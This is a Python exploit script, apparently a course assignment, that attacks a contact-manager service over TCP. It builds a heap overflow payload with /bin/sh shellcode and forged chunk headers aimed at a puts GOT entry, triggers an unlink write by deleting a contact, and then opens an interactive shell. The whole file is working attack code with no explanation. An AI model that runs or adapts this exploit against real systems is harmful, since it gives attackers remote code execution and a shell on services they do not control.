# python assign6payload1.py 192.168.147.179 9999
import socket
import sys
import time
import telnetlib
import struct

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact()

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server_address = (sys.argv[1], 9999)
print("Connecting to %s port %s" % server_address)
sock.connect(server_address)
time.sleep(1)

#                 jump 16                 shellcode                                                                                                   filler                                 sz                  sz               puts GOT-12  chunk+8                                                                                                                                     
payload = "BBBBAAAA\xeb\x10AAAAAAAAAAAAAAAA\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x06\x04\x05\xcd\x80" + "A"*196 + "BBBB" + struct.pack("<6I", -8 & 0xffffffff, 0, -8 & 0xffffffff, 0x804d01c , 0x804e118, 0) + "\n"
name1 = "AAAA\n"
name2 = "BBBB\n"
name3 = "CCCC\n"
delete = "BBBB\n"

#Contact 1
#receive initial prompt
ru(sock, "Quit\n")
#add first contact
sock.send("1\n")
#receive the response
ru(sock, "address)\n")
#send the name
sock.send(name1)

#Contact 2
#receive next prompt
ru(sock, "Quit\n")
#add second contact
sock.send("1\n")
#receive the response
ru(sock, "address)\n")
#send the name
sock.send(name2)

#Contact 3
#receive next prompt
ru(sock, "Quit\n")
#add third contact
sock.send("1\n")
#receive the response
ru(sock, "address)\n")
#send the name
sock.send(name3)

#Overwrite contact 2 with the payload
#receive next prompt
ru(sock, "Quit\n")
#edit second contact
sock.send("2\n")
#receive the response
ru(sock, "edit\n")
#send name to edit
sock.send(name2)
#receive the response
ru(sock, "address)\n")
#send the payload
sock.send(payload)

#Delete contact 2 to cause the unlink to happen
#receive next prompt
ru(sock, "Quit\n")
#remove a contact
sock.send("3\n")
#receive the response
ru(sock, "delete")
#send the name to remove
sock.send(delete)

# time.sleep(1)

interact(sock)






